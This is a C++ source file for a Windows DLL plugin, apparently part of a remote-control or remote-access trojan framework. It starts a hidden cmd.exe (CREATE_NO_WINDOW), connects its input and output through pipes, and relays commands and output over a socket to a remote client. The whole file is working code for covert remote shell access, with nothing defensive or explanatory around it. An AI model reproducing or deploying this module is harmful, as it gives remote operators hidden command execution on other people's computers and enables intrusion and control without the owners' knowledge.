#include "stdafx.h"

#include "DllCommon.h"

#include <windows.h>

extern "C" {
  __declspec(dllexport) int DBLoadDLLClient(std::unordered_map<std::string, pfnDBExportClient>& mapFunctions);
}

static int DBDllStartRemoteCmdR(const char *strParam, int nMsgLength,
  SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
static int DBDllRemoteCmdSendR(const char *strParam, int nMsgLength,
  SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
static int DBDllCloseRemoteCmdR(const char *strParam, int nMsgLength,
  SOCKET hSocketClient, pfnSendMessageOut pfnSMO);

static DWORD QueryingThreadFunc(LPVOID lpParam);


//所有的dll必须有，并且导出此函数
int DBLoadDLLClient(std::unordered_map<std::string, pfnDBExportClient>& mapFunctions)
{
  mapFunctions["StartRemoteCmdC"] = (pfnDBExportClient)DBDllStartRemoteCmdR;
  mapFunctions["RmotCmdSendCmdC"] = (pfnDBExportClient)DBDllRemoteCmdSendR;
  mapFunctions["CloseRemoteCmdC"] = (pfnDBExportClient)DBDllCloseRemoteCmdR;

  return 0;
}

/*
* mycmd.exe        cmd.exe
* hWritePipe ----> hCmdReadPipe
* hReadPipe <---- hCmdWritePipe
*/

//全局变量
HANDLE g_hReadPipe = INVALID_HANDLE_VALUE;
HANDLE g_hWritePipe = INVALID_HANDLE_VALUE;
HANDLE g_hCmdReadPipe = INVALID_HANDLE_VALUE;
HANDLE g_hCmdWritePipe = INVALID_HANDLE_VALUE;

PROCESS_INFORMATION g_piProcInfo;

HANDLE g_hQueryingThread = NULL;

SOCKET g_hClientSocket = 0;

int DBDllStartRemoteCmdR(const char *strParam, int nMsgLength,
  SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  g_hClientSocket = hSocketClient;

  //创建一个进程，设置它的标准输入输出
  SECURITY_ATTRIBUTES PipeAttributes = { 0 };
  PipeAttributes.nLength = sizeof(PipeAttributes);
  PipeAttributes.bInheritHandle = TRUE;

  BOOL bRet = 0;

  //0表示使用默认缓冲区大小
  bRet = CreatePipe(&g_hCmdReadPipe, &g_hWritePipe, &PipeAttributes, 0);
  bRet = CreatePipe(&g_hReadPipe, &g_hCmdWritePipe, &PipeAttributes, 0);

  STARTUPINFO siStartInfo = { 0 };
  siStartInfo.cb = sizeof(siStartInfo);
  siStartInfo.dwFlags = STARTF_USESTDHANDLES;
  siStartInfo.hStdInput = g_hCmdReadPipe;
  siStartInfo.hStdOutput = g_hCmdWritePipe;

  TCHAR szBuf[200] = _T("cmd.exe");

  bRet = CreateProcess(
    NULL,               //程序路径
    szBuf,      //command命令
    NULL,
    NULL,
    TRUE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    &siStartInfo,
    &g_piProcInfo
  );

  DWORD dwThreadID = 0;

  g_hQueryingThread = CreateThread(NULL, 0,
    (LPTHREAD_START_ROUTINE)QueryingThreadFunc, (LPVOID)pfnSMO, 0, &dwThreadID);

  pfnSMO(hSocketClient, _T("StartRemoteCmdR"), _T("nothing"), -1);

  return 0;
}

//read pipe data , show
DWORD QueryingThreadFunc(LPVOID lpParam)
{
  pfnSendMessageOut pfnSendMsg = (pfnSendMessageOut)lpParam;
  CString str;

  //查看管道信息
  while (true)
  {
    DWORD dwBytesRead = 0;
    DWORD dwTotalBytesAvail = 0;
    DWORD dwBytesLeftThisMessage = 0;

    //Sleep(10);
    BOOL bRet = PeekNamedPipe(
      g_hReadPipe,
      NULL,
      0,
      &dwBytesRead,
      &dwTotalBytesAvail,
      &dwBytesLeftThisMessage
    );

    if (dwTotalBytesAvail > 0)
    {
      bRet = ReadFile(
        g_hReadPipe,
        str.GetBufferSetLength(dwTotalBytesAvail),
        dwTotalBytesAvail,
        &dwBytesRead,
        NULL
      );

      if (bRet != 0)
      {
        pfnSendMsg(g_hClientSocket, _T("RemoteCmdMsg00N"), str.GetBuffer(0),
          -1);
      }
    }
  }

  return 0;
}

int DBDllRemoteCmdSendR(const char *strParam, int nMsgLength,
  SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  BOOL bRet = 0;

  CString strConsoleCommand;

  strConsoleCommand.Format("%s%c", strParam, '\n');

  DWORD dwNumberOfBytesWritten = 0;

  bRet = WriteFile(
    g_hWritePipe,
    strConsoleCommand,
    strConsoleCommand.GetLength(),
    &dwNumberOfBytesWritten,
    NULL
  );

  if (dwNumberOfBytesWritten == 0)
  {
    //没写内容的情况
    return 0;
  }

  pfnSMO(hSocketClient, _T("RmotCmdSendCmdR"), _T("nothing"), -1);

  return 0;
}

int DBDllCloseRemoteCmdR(const char *strParam, int nMsgLength,
  SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  TerminateProcess(g_piProcInfo.hProcess, 0);

  TerminateThread(g_hQueryingThread, 0);

  pfnSMO(hSocketClient, _T("CloseRemoteCmdR"), _T("nothing"), -1);

  return 0;
}